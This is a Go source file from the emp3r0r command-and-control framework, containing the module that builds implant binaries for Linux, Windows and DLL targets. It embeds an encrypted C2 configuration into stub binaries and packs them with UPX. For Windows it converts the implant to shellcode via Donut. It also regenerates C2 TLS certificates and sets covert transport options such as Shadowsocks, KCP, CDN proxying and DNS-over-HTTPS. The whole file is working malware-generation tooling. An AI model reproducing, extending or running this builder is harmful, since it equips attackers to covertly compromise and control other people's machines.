package cc

import (
	"bytes"
	"encoding/json"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

var Arch_List_Windows = []string{
	"386",
	"amd64",
}

var Arch_List_All = []string{
	"386",
	"amd64",
	"arm",
	"arm64",
	"mips",
	"mips64",
	"riscv64",
}

func modGenAgent() {
	var (
		outfile           string // write agent binary to this path
		arch_choice       string // CPU architecture
		agent_binary_path string
	)
	now := time.Now()
	stubFile := ""
	os_choice := Options["os"].Val
	arch_choice = Options["arch"].Val
	is_arch_valid := func(arch string) bool {
		list := Arch_List_All
		if os_choice == "windows" {
			list = Arch_List_Windows
		}
		for _, a := range list {
			if arch == a {
				return true
			}
		}
		return false
	}

	switch os_choice {
	case "linux":
		CliPrintInfo("You chose Linux")
		if !is_arch_valid(arch_choice) {
			CliPrintError("Invalid arch choice")
			return
		}
		CliPrintInfo("Generating agent for %s platform", arch_choice)
		stubFile = fmt.Sprintf("%s-%s", emp3r0r_data.Stub_Linux, arch_choice)
		outfile = fmt.Sprintf("%s/agent_linux_%s_%d-%d-%d_%d-%d-%d",
			EmpWorkSpace, arch_choice,
			now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
	case "windows":
		CliPrintInfo("You chose Windows")
		if !is_arch_valid(arch_choice) {
			CliPrintError("Invalid arch choice")
			return
		}
		stubFile = fmt.Sprintf("%s-%s", emp3r0r_data.Stub_Windows, arch_choice)
		outfile = fmt.Sprintf("%s/agent_windows_%s_%d-%d-%d_%d-%d-%d.exe",
			EmpWorkSpace, arch_choice,
			now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
	case "dll":
		CliPrintInfo("You chose Windows DLL")
		stubFile = fmt.Sprintf("%s-%s", emp3r0r_data.Stub_Windows_DLL, arch_choice)
		outfile = fmt.Sprintf("%s/agent_windows_%s_%d-%d-%d_%d-%d-%d.dll",
			EmpWorkSpace, arch_choice,
			now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())

	default:
		CliPrintError("Unsupported OS: %s", os_choice)
		return
	}

	// is this stub file available?
	if !util.IsExist(stubFile) {
		CliPrintError("%s not found, build it first", stubFile)
		return
	}

	// fill emp3r0r.json
	err := MakeConfig()
	if err != nil {
		CliPrintError("Failed to configure agent: %v", err)
		return
	}

	// read file
	jsonBytes, err := os.ReadFile(EmpConfigFile)
	if err != nil {
		CliPrintError("Parsing EmpConfigFile config file: %v", err)
		return
	}

	// encrypt
	encryptedJSONBytes, err := tun.AES_GCM_Encrypt(emp3r0r_data.OneTimeMagicBytes, jsonBytes)
	if err != nil {
		CliPrintError("Failed to encrypt %s: %v", EmpConfigFile, err)
		return
	}

	// write
	toWrite, err := os.ReadFile(stubFile)
	if err != nil {
		CliPrintError("Read stub: %v", err)
		return
	}
	sep := bytes.Repeat(emp3r0r_data.OneTimeMagicBytes, 2)

	// payload
	config_payload := append(sep, encryptedJSONBytes...)
	config_payload = append(config_payload, sep...)
	// fill in
	toWrite = bytes.Replace(toWrite,
		bytes.Repeat([]byte{0}, len(config_payload)),
		config_payload,
		1)
	// verify
	if !bytes.Contains(toWrite, config_payload) {
		CliPrintError("Failed to patch %s with config payload", stubFile)
		return
	}
	// write
	err = os.WriteFile(outfile, toWrite, 0o755)
	if err != nil {
		CliPrintError("Save agent binary %s: %v", outfile, err)
		return
	}

	// done
	CliPrintSuccess("Generated %s from %s and %s, you can run %s on arbitrary target",
		outfile, stubFile, EmpConfigFile, outfile)
	CliPrintDebug("OneTimeMagicBytes is %x", emp3r0r_data.OneTimeMagicBytes)
	agent_binary_path = outfile

	packed_file := fmt.Sprintf("%s.packed", outfile)
	if os_choice == "windows" {
		packed_file = fmt.Sprintf("%s.packed.exe", outfile)
	}

	// pack it with upx
	err = upx(outfile, packed_file)
	if err != nil {
		CliPrintWarning("UPX: %v", err)
		return
	}

	// append magic_str so it will still extract config data
	err = appendConfigToPayload(packed_file, sep, encryptedJSONBytes)
	if err != nil {
		CliPrintError("Failed to append config to packed binary: %v", err)
		return
	}

	agent_binary_path = packed_file
	CliPrint("Generated agent binary: %s.", agent_binary_path)

	if os_choice == "windows" {
		// generate shellcode for the agent binary
		DonoutPE2Shellcode(outfile, arch_choice)
		appendConfigToPayload(outfile+".bin", sep, encryptedJSONBytes)
	}
	if os_choice == "linux" {
		// tell user to use shared library stager
		CliPrint("Navigate to `loader/elf` and run `make stager_so` to generate shared library stager, don't forget to modify `stager.c` to fit your needs. You will need another stager to load the shared library.")
	}
}

func appendConfigToPayload(file string, sep, config []byte) (err error) {
	packed_bin_data, err := os.ReadFile(file)
	if err != nil {
		err = fmt.Errorf("failed to read file %s: %v", file, err)
		return
	}
	toWrite := append(packed_bin_data, sep...)
	toWrite = append(toWrite, config...)
	toWrite = append(toWrite, sep...)
	err = os.WriteFile(file, toWrite, 0o755)
	if err != nil {
		err = fmt.Errorf("failed to save final agent binary: %v", err)
		return
	}

	return
}

func MakeConfig() (err error) {
	// read existing config when possible
	var (
		jsonData   []byte
		config_map map[string]interface{}
	)
	if util.IsExist(EmpConfigFile) {
		CliPrintInfo("Reading config from existing %s", EmpConfigFile)
		jsonData, err = os.ReadFile(EmpConfigFile)
		if err != nil {
			CliPrintWarning("failed to read %s: %v", EmpConfigFile, err)
		}
		// load to map
		err = json.Unmarshal(jsonData, &config_map)
		if err != nil {
			CliPrintWarning("Parsing existing %s: %v", EmpConfigFile, err)
		}
	}

	// CC names and certs
	RuntimeConfig.CCHost = Options["cc_host"].Val
	existing_names := tun.NamesInCert(ServerCrtFile)
	cc_hosts := existing_names
	exists := false
	for _, c2_name := range existing_names {
		if c2_name == RuntimeConfig.CCHost {
			exists = true
			break
		}
	}
	// if user is requesting a new server name, server cert needs to be re-generated
	if !exists {
		CliPrintWarning("Name '%s' is not covered by our server cert, re-generating",
			RuntimeConfig.CCHost)
		cc_hosts = append(cc_hosts, RuntimeConfig.CCHost) // append new name
		// remove old certs
		os.RemoveAll(ServerCrtFile)
		os.RemoveAll(ServerKeyFile)
		err = GenC2Certs(cc_hosts)
		if err != nil {
			return fmt.Errorf("GenAgent: failed to generate certs: %v", err)
		}
		err = EmpTLSServer.Shutdown(EmpTLSServerCtx)
		if err != nil {
			CliPrintError("%v. You will need to restart emp3r0r C2 server to apply name '%s'",
				err, RuntimeConfig.CCHost)
		} else {
			CliPrintWarning("Restarting C2 TLS service at port %s to apply new server cert", RuntimeConfig.CCPort)

			c2_names := tun.NamesInCert(ServerCrtFile)
			if len(c2_names) <= 0 {
				CliFatalError("C2 has no names?")
			}
			name_list := strings.Join(c2_names, ", ")
			CliPrintInfo("Updated C2 server names: %s", name_list)
			go TLSServer()
		}
	}

	// CC indicator
	RuntimeConfig.CCIndicator = Options["cc_indicator"].Val
	RuntimeConfig.CCIndicatorText = Options["indicator_text"].Val
	if RuntimeConfig.CCIndicatorText != "" {
		CliMsg("Remember to put text %s in your indicator (%s) response",
			strconv.Quote(RuntimeConfig.CCIndicatorText), RuntimeConfig.CCIndicator)
	}

	if Options["ncsi"].Val == "on" {
		RuntimeConfig.DisableNCSI = true
	} else {
		RuntimeConfig.DisableNCSI = false
	}

	// CDN proxy
	RuntimeConfig.CDNProxy = Options["cdn_proxy"].Val

	// shadowsocks and kcp
	RuntimeConfig.UseShadowsocks = Options["shadowsocks"].Val == "on" || Options["shadowsocks"].Val == "bare"
	RuntimeConfig.UseKCP = Options["shadowsocks"].Val != "bare" && RuntimeConfig.UseShadowsocks

	// agent proxy for c2 transport
	RuntimeConfig.C2TransportProxy = Options["c2transport_proxy"].Val
	RuntimeConfig.AutoProxyTimeout, err = strconv.Atoi(Options["autoproxy_timeout"].Val)
	if err != nil {
		CliPrintWarning("Parsing autoproxy_timeout: %v. Setting to 0.", err)
		RuntimeConfig.AutoProxyTimeout = 0
	}
	RuntimeConfig.DoHServer = Options["doh_server"].Val
	if Options["auto_proxy"].Val == "on" {
		RuntimeConfig.BroadcastIntervalMax = 120
	} else {
		RuntimeConfig.BroadcastIntervalMax = 0
	}

	// save emp3r0r.json
	return save_config_json()
}
